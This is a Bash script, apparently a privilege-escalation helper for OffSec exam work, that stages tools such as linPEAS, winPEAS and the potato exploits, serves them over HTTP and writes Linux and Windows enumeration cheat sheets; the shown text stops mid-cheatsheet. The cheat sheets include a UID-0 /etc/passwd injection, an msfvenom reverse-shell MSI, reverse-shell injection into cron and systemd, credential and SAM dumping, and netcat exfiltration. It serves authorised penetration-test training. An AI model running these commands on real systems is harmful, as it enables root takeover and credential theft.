#!/usr/bin/env bash
#==============================================================================
# ESCALATR.SH — OffSec Privilege Escalation Enumeration Orchestrator
#==============================================================================
# Runs on KALI after gaining a low-priv shell. Generates and serves privesc
# enumeration scripts/commands for Linux and Windows targets. Collects
# results and produces a prioritized findings report.
#
# IMPORTANT: This script is ENUMERATION ONLY — no auto-exploitation.
# Compliant with OffSec engagement rules.
#
# WORKFLOW:
#   1. Detect target OS (Linux or Windows) or specify with --os flag
#   2. Stage privesc tools for transfer (linpeas, winpeas, pspy, etc.)
#   3. Generate one-liner enumeration commands for the target
#   4. Parse results from enumeration tool output (if provided)
#   5. Produce prioritized quick-wins report
#
# USAGE:
#   ./escalatr.sh <TARGET_IP> --os linux        # Linux target
#   ./escalatr.sh <TARGET_IP> --os windows      # Windows target
#   ./escalatr.sh <TARGET_IP>                   # Auto-detect via port scan
#   ./escalatr.sh --parse <linpeas_output>      # Parse existing output
#   ./escalatr.sh --serve <TARGET_IP>           # Just serve tools
#   ./escalatr.sh --commands linux              # Print command cheatsheet
#   ./escalatr.sh --commands windows            # Print command cheatsheet
#
# OUTPUT STRUCTURE:
#   privesc/<IP>/
#   ├── tools/              # Staged privesc tools for transfer
#   ├── commands.txt        # Copy-paste enumeration commands
#   ├── quick-wins.txt      # Prioritized findings
#   ├── raw/                # Raw tool output (if collected)
#   └── progress.log        # What's done, what's running
#
# DESIGN DECISIONS:
#   - Single file: reliability > elegance on engagement day
#   - No auto-exploitation: enumeration and reporting only
#   - Generates copy-paste commands: you run them on target
#   - Parses output for quick-wins: saves reading time under pressure
#   - Tool staging: downloads latest tools, serves via HTTP
#   - Follows recon.sh conventions for consistent toolkit
#==============================================================================

set -o pipefail

#------------------------------------------------------------------------------
# CONFIGURATION
#------------------------------------------------------------------------------
if [[ -z "${TOOLKIT_ROOT:-}" ]]; then
    if [[ -n "${SUDO_USER:-}" ]]; then
        _inv_home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
        TOOLKIT_ROOT="${_inv_home:-$HOME}/offsec"
        unset _inv_home
    else
        TOOLKIT_ROOT="${HOME}/offsec"
    fi
fi
PRIVESC_DIR="${TOOLKIT_ROOT}/privesc"         # Base output directory
TOOLS_CACHE="$HOME/.offsec_tools/privesc"    # Cached tool downloads
HTTP_PORT=8888                             # HTTP server port for tool serving
SERVE_TIMEOUT=1800                         # Auto-stop HTTP server after 30 min (plenty for engagement transfers)
REMOTE_TMP="/tmp"                            # Remote writable dir (override with --remote-tmp if /tmp is noexec)
OFFLINE_MODE=false                           # --offline skips network, cache-only

# Absolute directory of this script — used to emit PWD-independent commands
# that reference sibling scripts (sprayr.sh, crackr.sh, pivotr.sh).
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Tool URLs — verified as of March 2026
LINPEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
LINPEAS_FAT_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_fat.sh"
WINPEAS_X64_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
WINPEAS_X86_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe"
PSPY64_URL="https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"
PSPY32_URL="https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32"
PRINTSPOOFER_URL="https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe"
SIGMAPOTATO_URL="https://github.com/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotato.exe"
GODPOTATO_NET4_URL="https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe"
GODPOTATO_NET2_URL="https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET2.exe"
LES_URL="https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"
POWERUP_URL="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
SEATBELT_NOTE="Compile from: https://github.com/GhostPack/Seatbelt (requires Visual Studio)"
FULLPOWERS_URL="https://github.com/itm4n/FullPowers/releases/latest/download/FullPowers.exe"
RUNASCS_URL="https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip"

#------------------------------------------------------------------------------
# COLORS & OUTPUT HELPERS (matching recon.sh conventions)
#------------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
{ [[ -n "${NO_COLOR:-}" ]] || [[ ! -t 1 ]]; } && disable_colors

ts() { date '+%H:%M:%S'; }

info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[$(ts)] [!]${NC} $*"; }
error()   { echo -e "${RED}[$(ts)] [-]${NC} $*"; }
header()  { echo -e "\n${BOLD}${CYAN}═══════════════════════════════════════════════════${NC}"; \
            echo -e "${BOLD}${CYAN}  $*${NC}"; \
            echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════${NC}"; }
phase()   { echo -e "\n${MAGENTA}[$(ts)] [PHASE]${NC} ${BOLD}$*${NC}"; }
quickwin(){ echo -e "${RED}[$(ts)] [!!!]${NC} ${BOLD}$*${NC}"; }

# Validate an IPv4 address (4 dotted octets, each 0-255).
is_valid_ip() {
    local ip="$1"
    [[ "$ip" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || return 1
    local octet
    local IFS='.'
    local -a octets
    read -ra octets <<< "$ip"
    for octet in "${octets[@]}"; do
        (( 10#$octet <= 255 )) || return 1
    done
}

#------------------------------------------------------------------------------
# PROGRESS TRACKING
#------------------------------------------------------------------------------
progress_log() {
    local logfile="$1/progress.log"
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $2 | $3 | $4" >> "$logfile"
}

#------------------------------------------------------------------------------
# CLEANUP
#------------------------------------------------------------------------------
declare -a CHILD_PIDS=()
HTTP_SERVER_PID=""
CLEANUP_RUNNING=false

cleanup() {
    local exit_code="${1:-0}"
    if [[ "$CLEANUP_RUNNING" == "true" ]]; then
        return
    fi
    CLEANUP_RUNNING=true
    trap - EXIT INT TERM
    # Only announce cleanup when there is actually something to clean.
    # Prevents noise after --help, bad flags, or any early exit.
    local have_work=false
    if (( ${#CHILD_PIDS[@]} > 0 )); then have_work=true; fi
    if [[ -n "$HTTP_SERVER_PID" ]] && kill -0 "$HTTP_SERVER_PID" 2>/dev/null; then have_work=true; fi
    if [[ "$have_work" == "true" ]]; then
        warn "Cleaning up..."
        for pid in "${CHILD_PIDS[@]}"; do
            kill "$pid" 2>/dev/null && wait "$pid" 2>/dev/null
        done
        if [[ -n "$HTTP_SERVER_PID" ]]; then
            kill "$HTTP_SERVER_PID" 2>/dev/null && wait "$HTTP_SERVER_PID" 2>/dev/null
            success "HTTP server stopped"
        fi
    fi
    if [[ "$exit_code" -ne 0 ]]; then
        exit "$exit_code"
    fi
}
trap 'cleanup 0' EXIT
trap 'cleanup 130' INT TERM

#------------------------------------------------------------------------------
# HELPER: Get Kali IP (for transfer commands)
#------------------------------------------------------------------------------
get_kali_ip() {
    # Try tun0 first (VPN), then eth0, then any non-lo interface
    local ip=""
    ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    if [[ -z "$ip" ]]; then
        ip=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    fi
    if [[ -z "$ip" ]]; then
        ip=$(ip -4 route get 1 2>/dev/null | grep -oP 'src \K\S+' | head -1)
    fi
    echo "${ip:-YOUR_KALI_IP}"
}

is_valid_target() {
    local target="$1"
    if [[ "$target" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        local IFS='.'
        local octets=()
        read -r -a octets <<< "$target"
        local octet=""
        for octet in "${octets[@]}"; do
            (( 10#$octet <= 255 )) || return 1
        done
        return 0
    fi
    [[ "$target" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*$ ]]
}

is_valid_port() {
    [[ "$1" =~ ^[0-9]+$ ]] && (( 1 <= $1 && $1 <= 65535 ))
}

normalize_os() {
    case "${1,,}" in
        linux) echo "linux" ;;
        win|windows) echo "windows" ;;
        *) return 1 ;;
    esac
}

#------------------------------------------------------------------------------
# TOOL STAGING: Download and cache privesc tools
#------------------------------------------------------------------------------
stage_tools() {
    local target_os="$1"
    local target_dir="$2"
    local tools_dir="$target_dir/tools"

    phase "Staging privesc tools for ${target_os}"
    mkdir -p "$tools_dir" "$TOOLS_CACHE"

    download_tool() {
        local url="$1"
        local filename="$2"
        local cached="$TOOLS_CACHE/$filename"

        if [[ -f "$cached" ]]; then
            # Use cache if less than 7 days old (or always in offline mode)
            if [[ "${OFFLINE_MODE:-false}" == "true" ]] || [[ $(find "$cached" -mtime -7 2>/dev/null) ]]; then
                info "Using cached: $filename"
                cp "$cached" "$tools_dir/$filename"
                return 0
            fi
        fi

        if [[ "${OFFLINE_MODE:-false}" == "true" ]]; then
            warn "Offline mode: no cache for $filename (expected at $cached)"
            return 1
        fi

        info "Downloading: $filename"
        if wget -q --timeout=30 "$url" -O "$cached" 2>/dev/null; then
            cp "$cached" "$tools_dir/$filename"
            success "Downloaded: $filename"
            return 0
        elif curl -fsSL --connect-timeout 30 "$url" -o "$cached" 2>/dev/null; then
            cp "$cached" "$tools_dir/$filename"
            success "Downloaded: $filename"
            return 0
        else
            warn "Failed to download: $filename (manually place in $tools_dir)"
            rm -f "$cached"
            return 1
        fi
    }

    if [[ "$target_os" == "linux" ]]; then
        download_tool "$LINPEAS_URL" "linpeas.sh"
        download_tool "$LINPEAS_FAT_URL" "linpeas_fat.sh"
        download_tool "$PSPY64_URL" "pspy64"
        download_tool "$PSPY32_URL" "pspy32"
        download_tool "$LES_URL" "les.sh"
        # Make scripts executable
        chmod +x "$tools_dir"/*.sh "$tools_dir"/pspy* 2>/dev/null
    elif [[ "$target_os" == "windows" ]]; then
        download_tool "$WINPEAS_X64_URL" "winPEASx64.exe"
        download_tool "$WINPEAS_X86_URL" "winPEASx86.exe"
        download_tool "$PRINTSPOOFER_URL" "PrintSpoofer64.exe"
        download_tool "$SIGMAPOTATO_URL" "SigmaPotato.exe"
        download_tool "$GODPOTATO_NET4_URL" "GodPotato-NET4.exe"
        download_tool "$GODPOTATO_NET2_URL" "GodPotato-NET2.exe"
        download_tool "$POWERUP_URL" "PowerUp.ps1"
        download_tool "$FULLPOWERS_URL" "FullPowers.exe"
        download_tool "$RUNASCS_URL" "RunasCs.zip"
        # Reminder for tools that need manual compilation
        warn "Seatbelt requires manual compilation: $SEATBELT_NOTE"
        info "accesschk: copy from /usr/share/windows-resources/sysinternals/ if available"
        if [[ -f "/usr/share/windows-resources/sysinternals/accesschk64.exe" ]]; then
            cp "/usr/share/windows-resources/sysinternals/accesschk64.exe" "$tools_dir/accesschk64.exe"
            success "Copied accesschk64.exe from Kali"
        fi
    fi

    success "Tools staged in: $tools_dir"
    ls -lah "$tools_dir" 2>/dev/null
}

#------------------------------------------------------------------------------
# HTTP SERVER: Serve tools for target download
#------------------------------------------------------------------------------
serve_tools() {
    local tools_dir="$1"
    local kali_ip=""
    kali_ip=$(get_kali_ip)

    if ! [[ -d "$tools_dir" ]] || [[ -z "$(ls -A "$tools_dir" 2>/dev/null)" ]]; then
        error "No tools found in $tools_dir — run staging first"
        return 1
    fi

    # Kill any existing server on our port (fuser may not be installed)
    if command -v fuser &>/dev/null; then
        fuser -k "$HTTP_PORT/tcp" 2>/dev/null
    else
        # Fallback: find and kill process on our port
        local existing_pid=""
        existing_pid=$(lsof -ti :"$HTTP_PORT" 2>/dev/null || ss -tlnp 2>/dev/null | grep ":$HTTP_PORT " | grep -oP 'pid=\K[0-9]+' || true)
        if [[ -n "$existing_pid" ]]; then
            kill "$existing_pid" 2>/dev/null || true
        fi
    fi
    sleep 0.5

    phase "Starting HTTP server on port $HTTP_PORT"
    info "Serving from: $tools_dir"
    echo ""

    # Print download commands for each file
    success "Transfer commands for target:"
    echo -e "${BOLD}───────────────────────────────────────────────────${NC}"
    local fname=""
    for f in "$tools_dir"/*; do
        fname=$(basename "$f")
        if [[ "$fname" == *.sh ]]; then
            local base="${fname%.sh}"
            echo -e "  ${CYAN}# Linux: download${NC}"
            echo -e "  wget http://${kali_ip}:${HTTP_PORT}/${fname} -O ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
            echo -e "  curl http://${kali_ip}:${HTTP_PORT}/${fname} -o ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
            echo -e "  ${CYAN}# Run (saves output for parsing):${NC}"
            echo -e "  ${REMOTE_TMP}/${fname} | tee ${REMOTE_TMP}/${base}_output.txt"
        elif [[ "$fname" == *.zip ]]; then
            echo -e "  ${CYAN}# Windows: download + unzip${NC}"
            echo -e "  iwr -uri http://${kali_ip}:${HTTP_PORT}/${fname} -Outfile C:\\Users\\Public\\${fname}"
            echo -e "  Expand-Archive -Path C:\\Users\\Public\\${fname} -DestinationPath C:\\Users\\Public\\ -Force"
        elif [[ "$fname" == *.exe ]]; then
            local base="${fname%.exe}"
            echo -e "  ${CYAN}# Windows: download${NC}"
            echo -e "  iwr -uri http://${kali_ip}:${HTTP_PORT}/${fname} -Outfile C:\\Users\\Public\\${fname}"
            echo -e "  certutil -urlcache -split -f http://${kali_ip}:${HTTP_PORT}/${fname} C:\\Users\\Public\\${fname}"
            echo -e "  ${CYAN}# Run (saves output for parsing):${NC}"
            echo -e "  .\\${fname} > C:\\Users\\Public\\${base}_output.txt"
        elif [[ "$fname" == *.ps1 ]]; then
            echo -e "  ${CYAN}# Windows: download${NC}"
            echo -e "  iwr -uri http://${kali_ip}:${HTTP_PORT}/${fname} -Outfile C:\\Users\\Public\\${fname}"
            echo -e "  certutil -urlcache -split -f http://${kali_ip}:${HTTP_PORT}/${fname} C:\\Users\\Public\\${fname}"
        else
            local base="${fname%.*}"
            echo -e "  ${CYAN}# Transfer: ${fname}${NC}"
            echo -e "  wget http://${kali_ip}:${HTTP_PORT}/${fname} -O ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
            echo -e "  curl http://${kali_ip}:${HTTP_PORT}/${fname} -o ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
            echo -e "  ${CYAN}# Run (saves output for parsing):${NC}"
            echo -e "  ${REMOTE_TMP}/${fname} | tee ${REMOTE_TMP}/${base}_output.txt"
        fi
        echo ""
    done
    echo -e "${BOLD}───────────────────────────────────────────────────${NC}"

    # Print noexec detection + fallback tips
    if [[ "$REMOTE_TMP" == "/tmp" ]]; then
        echo ""
        warn "If ${REMOTE_TMP} is noexec, run this on target to check:"
        echo -e "  ${CYAN}mount | grep ' ${REMOTE_TMP} ' | grep noexec${NC}"
        echo ""
        echo -e "  ${CYAN}# Fallback writable+exec dirs to try:${NC}"
        echo -e "  ${CYAN}#   /dev/shm, /var/tmp, \$HOME, or cwd${NC}"
        echo ""
        echo -e "  ${CYAN}# For shell scripts on noexec mount — run via interpreter:${NC}"
        echo -e "  bash ${REMOTE_TMP}/linpeas.sh"
        echo ""
        echo -e "  ${CYAN}# For ELF binaries on noexec mount — run via ld.so:${NC}"
        echo -e "  /lib64/ld-linux-x86-64.so.2 ${REMOTE_TMP}/pspy64"
        echo -e "  /lib/ld-linux.so.2 ${REMOTE_TMP}/pspy32"
        echo ""
        echo -e "${BOLD}───────────────────────────────────────────────────${NC}"
    fi

    echo ""
    success "Transfer output back to Kali:"
    echo -e "${BOLD}───────────────────────────────────────────────────${NC}"
    echo -e "  ${CYAN}# Kali (run first):${NC}"
    echo -e "  nc -lvnp 9001 > linpeas_output.txt"
    echo -e "  ${CYAN}# Target:${NC}"
    echo -e "  nc ${kali_ip} 9001 < ${REMOTE_TMP}/linpeas_output.txt"
    echo ""
    echo -e "  ${CYAN}# Then parse on Kali:${NC}"
    echo -e "  ./escalatr.sh --parse linpeas_output.txt --os linux"
    echo -e "${BOLD}───────────────────────────────────────────────────${NC}"
    echo ""

    # Start server in background (subshell avoids changing working directory)
    (cd "$tools_dir" && exec python3 -m http.server "$HTTP_PORT") &>/dev/null &
    HTTP_SERVER_PID=$!
    sleep 0.5
    if ! kill -0 "$HTTP_SERVER_PID" 2>/dev/null; then
        error "HTTP server failed to start on port $HTTP_PORT"
        error "Check: Is python3 installed? Is port $HTTP_PORT already in use?"
        HTTP_SERVER_PID=""
        return 1
    fi

    success "HTTP server running (PID: $HTTP_SERVER_PID) — will auto-stop after ${SERVE_TIMEOUT}s"
    info "Press Ctrl+C to stop manually"

    # Auto-stop after timeout
    (
        sleep "$SERVE_TIMEOUT"
        if kill -0 "$HTTP_SERVER_PID" 2>/dev/null; then
            kill "$HTTP_SERVER_PID" 2>/dev/null
        fi
    ) &
    CHILD_PIDS+=("$!")
}

#==============================================================================
# LINUX ENUMERATION COMMANDS
#==============================================================================
generate_linux_commands() {
    local target_ip="$1"
    local target_dir="$2"
    local cmd_file="$target_dir/commands.txt"
    local kali_ip=""
    kali_ip=$(get_kali_ip)

    phase "Generating Linux privesc commands"

    cat > "$cmd_file" << 'LINUX_COMMANDS'
#==============================================================================
# LINUX PRIVILEGE ESCALATION — ENUMERATION COMMANDS
# Run these on target after gaining low-priv shell
# Priority: TOP → BOTTOM (most likely engagement vectors first)
#==============================================================================

#----------------------------------------------------------------------
# PHASE 0: IMMEDIATE CONTEXT (run these FIRST, every single time)
#----------------------------------------------------------------------
id
whoami
hostname
uname -a
cat /etc/os-release 2>/dev/null || cat /etc/issue

#----------------------------------------------------------------------
# PHASE 1: HIGH-VALUE QUICK CHECKS (80% of OffSec privesc)
#----------------------------------------------------------------------

### 1a. sudo -l — THE SINGLE MOST IMPORTANT COMMAND ###
sudo -l
# If NOPASSWD entry → check GTFOBins: https://gtfobins.github.io/
# If env_keep+=LD_PRELOAD → LD_PRELOAD hijack
# If env_keep+=LD_LIBRARY_PATH → library hijack
# If (user2) → lateral pivot, not direct root

### 1b. SUID binaries ###
find / -perm -4000 -type f 2>/dev/null
# Cross-reference EVERY result with GTFOBins
# Custom/non-standard SUID binaries = high priority

### 1b2. SGID binaries ###
find / -perm -2000 -type f 2>/dev/null

### 1c. Capabilities ###
/usr/sbin/getcap -r / 2>/dev/null
# cap_setuid+ep on interpreter (python/perl/ruby) → instant root
# cap_dac_read_search → read /etc/shadow, SSH keys

### 1d. Writable critical files ###
ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
# Writable /etc/passwd → add UID 0 user:
#   openssl passwd -1 w00t
#   echo 'root2:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

### 1e. Cron jobs (check ALL locations) ###
cat /etc/crontab
ls -la /etc/cron.d/ 2>/dev/null
ls -la /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null
crontab -l 2>/dev/null
systemctl list-timers 2>/dev/null
# Writable cron script? → inject reverse shell
# Wildcard in tar/rsync command? → wildcard injection
# Command without absolute path? → PATH hijack

### 1f. sudo version (known CVEs) ###
sudo --version
# < 1.8.28 → CVE-2019-14287: sudo -u#-1 /bin/bash
# 1.8.2-1.8.31p2 / 1.9.0-1.9.5p1 → CVE-2021-3156 Baron Samedit

### 1g. Writable systemd service files ###
find /etc/systemd/system -writable -type f 2>/dev/null
find /lib/systemd/system -writable -type f 2>/dev/null
# If writable: inject reverse shell into ExecStart, then systemctl daemon-reload && systemctl restart <service>

### 1h. Shared object / library hijacking ###
# Check SUID binaries for missing shared objects:
# ldd /usr/local/bin/suid-binary
# strace /usr/local/bin/suid-binary 2>&1 | grep "open.*\.so"
# If loading from writable path → compile malicious .so

#----------------------------------------------------------------------
# PHASE 2: AUTOMATED TOOLS (run while doing manual checks)
#----------------------------------------------------------------------

### linpeas (redirect output — it scrolls fast) ###
# ./linpeas.sh | tee ${REMOTE_TMP}/linpeas_output.txt
# RED/YELLOW findings = highest priority

### pspy (catch hidden cron jobs / processes) ###
# ./pspy64                     # 64-bit
# ./pspy32                     # 32-bit
# Watch for: root processes, scheduled commands, password in CLI args

### linux-exploit-suggester (kernel vulns — last resort) ###
# ./les.sh

#----------------------------------------------------------------------
# PHASE 3: CREDENTIAL HUNTING
#----------------------------------------------------------------------

### Bash history ###
cat ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null

### Config files ###
grep -r "password\|passwd\|pass\|secret\|key\|token" /etc/ 2>/dev/null | grep -v "^Binary" | head -50
find / -name "*.conf" -o -name "*.config" -o -name "*.cnf" -o -name "*.ini" -o -name "*.env" -o -name "wp-config.php" 2>/dev/null | head -30

### SSH keys ###
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null

### Environment variables ###
env | grep -iE "pass|key|secret|token"
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|key|secret|token"

### Database files ###
find / -name "*.db" -o -name "*.sql" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | grep -v "lib\|share\|cache"

### Process credentials ###
ps aux | grep -iE "pass|user|cred|key"

#----------------------------------------------------------------------
# PHASE 4: NETWORK & SERVICES
#----------------------------------------------------------------------

### Internal services (port forward to exploit) ###
ss -tlnp
# 127.0.0.1 listeners = internal-only services → port forward → exploit

### Dual-homed / pivot ###
ip a
ip route
cat /etc/hosts
arp -a 2>/dev/null

### Firewall ###
cat /etc/iptables/rules.v4 2>/dev/null
iptables -L -n 2>/dev/null

#----------------------------------------------------------------------
# PHASE 5: GROUP-BASED ESCALATION
#----------------------------------------------------------------------

### Check group membership ###
id
# docker group → docker run -v /:/mnt --rm -it alpine chroot /mnt bash
# lxd group   → lxd container with host mount
# disk group  → raw disk read (debugfs /dev/sda)
# adm group   → read logs for credentials

#----------------------------------------------------------------------
# PHASE 6: NFS (often missed!) ###
#----------------------------------------------------------------------
cat /etc/exports 2>/dev/null
# no_root_squash → mount from Kali as root, place SUID binary
# Run from Kali: showmount -e TARGET_IP

#----------------------------------------------------------------------
# PHASE 7: KERNEL EXPLOITS (LAST RESORT — may crash target)
#----------------------------------------------------------------------
uname -r
arch
cat /etc/os-release
# Common: DirtyPipe (5.8-5.16.11), PwnKit (CVE-2021-4034), DirtyCow (2.6.22-4.8.3)
# sudo --version  → Baron Samedit (1.8.2-1.8.31p2 / 1.9.0-1.9.5p1)

#----------------------------------------------------------------------
# COMPLETE QUICK-RUN BLOCK (copy-paste entire block)
#----------------------------------------------------------------------
echo "===== CONTEXT =====" && id && whoami && hostname && uname -a && echo "===== SUDO =====" && sudo -l 2>/dev/null && sudo --version 2>/dev/null | head -1 && echo "===== SUID =====" && find / -perm -4000 -type f 2>/dev/null && echo "===== SGID =====" && find / -perm -2000 -type f 2>/dev/null && echo "===== CAPS =====" && /usr/sbin/getcap -r / 2>/dev/null && echo "===== CRIT FILES =====" && ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null && echo "===== CRON =====" && cat /etc/crontab 2>/dev/null && ls -la /etc/cron.d/ 2>/dev/null && ls -la /var/spool/cron/crontabs/ 2>/dev/null && echo "===== SYSTEMD WRITABLE =====" && find /etc/systemd/system -writable -type f 2>/dev/null && echo "===== INTERNAL SVC =====" && ss -tlnp && echo "===== NFS =====" && cat /etc/exports 2>/dev/null && echo "===== NET =====" && ip a && ip route && echo "===== GROUPS =====" && id && echo "===== DONE ====="
LINUX_COMMANDS

    # Replace placeholders with actual values
    sed -i "s/KALI_IP_PLACEHOLDER/${kali_ip}/g" "$cmd_file" 2>/dev/null

    success "Linux commands written to: $cmd_file"
}

#==============================================================================
# WINDOWS ENUMERATION COMMANDS
#==============================================================================
generate_windows_commands() {
    local target_ip="$1"
    local target_dir="$2"
    local cmd_file="$target_dir/commands.txt"
    local kali_ip=""
    kali_ip=$(get_kali_ip)

    phase "Generating Windows privesc commands"

    cat > "$cmd_file" << 'WINDOWS_COMMANDS'
#==============================================================================
# WINDOWS PRIVILEGE ESCALATION — ENUMERATION COMMANDS
# Run these on target after gaining low-priv shell
# Priority: TOP → BOTTOM (most likely engagement vectors first)
#==============================================================================

#----------------------------------------------------------------------
# PHASE 0: IMMEDIATE CONTEXT (run these FIRST, every single time)
#----------------------------------------------------------------------
whoami
whoami /priv
whoami /groups
hostname
systeminfo

#----------------------------------------------------------------------
# PHASE 1: HIGH-VALUE QUICK CHECKS
#----------------------------------------------------------------------

### 1a. Token Privileges — #1 Windows OffSec vector ###
whoami /priv
# SeImpersonatePrivilege → PrintSpoofer / GodPotato / SigmaPotato
#   Windows 10/Server 2016-2019: PrintSpoofer64.exe -i -c powershell.exe
#   Windows 8-11/Server 2012-2022: SigmaPotato.exe "cmd /c whoami"
#   Broad compat: GodPotato-NET4.exe -cmd "cmd /c whoami"
#   If SeImpersonate missing on Local/Network Service: FullPowers.exe -c "cmd /c whoami /priv" -z
# SeBackupPrivilege → reg save hklm\sam / hklm\system → secretsdump
# SeDebugPrivilege → procdump lsass / migrate to SYSTEM process
# SeManageVolumePrivilege → SeManageVolumeExploit → DLL hijack → SYSTEM
# SeRestorePrivilege → overwrite service binary
# SeLoadDriverPrivilege → load vulnerable signed driver (Capcom, dbutil_2_3.sys) for kernel EoP
# SeTakeOwnershipPrivilege → takeown + icacls any SYSTEM file → overwrite service binary
# SeAssignPrimaryTokenPrivilege → same Potato chain as SeImpersonate (often on Service accounts)

### 1b. Stored credentials ###
cmdkey /list
# If entries exist: runas /savecred /user:DOMAIN\admin cmd.exe

### 1c. PowerShell history (ALWAYS check) ###
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Get-ChildItem -Path C:\Users\ -Include ConsoleHost_history.txt -File -Recurse -ErrorAction SilentlyContinue

### 1d. Service misconfigurations ###
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
# Check binary permissions: icacls "C:\path\to\service.exe"
# F or M for BUILTIN\Users = writable → replace with payload

### 1e. Unquoted service paths ###
# cmd.exe version:
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v """"
# PowerShell version:
# Get-CimInstance -ClassName win32_service | Where-Object { $_.PathName -notmatch '"' -and $_.PathName -match ' ' } | Select Name,PathName

### 1f. Scheduled tasks ###
schtasks /query /fo LIST /v
# Writable task binary running as SYSTEM = gold

### 1g. AlwaysInstallElevated (often missed!) ###
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
# Both = 1? → msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP_PLACEHOLDER LPORT=4444 -f msi -o shell.msi
# Then: msiexec /quiet /qn /i shell.msi

#----------------------------------------------------------------------
# PHASE 2: AUTOMATED TOOLS
#----------------------------------------------------------------------

### winPEAS ###
# .\winPEASx64.exe > C:\Users\Public\winpeas.txt
# RED findings = almost certain privesc

### PowerUp ###
# powershell -ep bypass
# . .\PowerUp.ps1
# Invoke-AllChecks

### Key PowerUp functions ###
# Get-ModifiableServiceFile      — writable service binaries
# Get-ModifiableService          — weak service ACLs (sc config abuse)
# Get-UnquotedService            — unquoted paths with writable gaps
# Install-ServiceBinary          — auto-replace (understand what it does first!)

#----------------------------------------------------------------------
# PHASE 3: CREDENTIAL HUNTING
#----------------------------------------------------------------------

### File search for passwords ###
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml 2>nul
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.xml,*.config,*.kdbx -File -Recurse -ErrorAction SilentlyContinue 2>nul | Select-String -Pattern "password" -CaseSensitive:$false 2>nul

### KeePass databases ###
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

### Hidden files ###
Get-ChildItem -Path C:\Users\ -Recurse -Attributes Hidden -ErrorAction SilentlyContinue

### Web config files ###
Get-ChildItem -Path C:\inetpub -Include web.config -File -Recurse -ErrorAction SilentlyContinue
type C:\inetpub\wwwroot\web.config 2>nul

### SAM/SYSTEM dump (if admin already) ###
# reg.exe save hklm\sam C:\Users\Public\sam.save
# reg.exe save hklm\system C:\Users\Public\system.save
# Transfer to Kali: impacket-secretsdump -sam sam.save -system system.save LOCAL

### PowerShell event logs (script block logging) ###
Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational -MaxEvents 50 2>nul | Where-Object {$_.ID -eq 4104} | Select-Object -Property Message

### PowerShell transcript files ###
Get-ChildItem -Path C:\Users\ -Include *.txt -Recurse -File -ErrorAction SilentlyContinue 2>nul | Select-String "transcript" 2>nul

### Unattend / sysprep files (cleartext creds) ###
Get-ChildItem -Path C:\ -Include Unattend.xml,unattend.xml,sysprep.xml,sysprep.inf -File -Recurse -ErrorAction SilentlyContinue 2>nul

### AutoLogon registry (cleartext password) ###
